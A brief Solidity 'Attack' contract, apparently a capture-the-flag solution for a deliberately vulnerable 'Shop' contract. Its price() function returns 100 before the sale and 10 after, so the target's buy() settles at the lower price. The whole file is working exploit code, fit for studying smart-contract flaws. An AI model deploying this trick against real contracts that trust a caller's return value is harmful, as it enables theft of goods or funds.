//SPDX-License-Identifier:MIT
pragma solidity ^0.6.0;

import "./shopFork.sol";

contract Attack{
    Shop public tar;
    constructor(address payable addr)public{
        tar=Shop(addr);
    }

    function price()external view returns(uint256 ){
        if(tar.isSold()){
            return 10;
        }
        else{
            return 100;
        }
    }

    function attack()external{
        tar.buy();
    }
}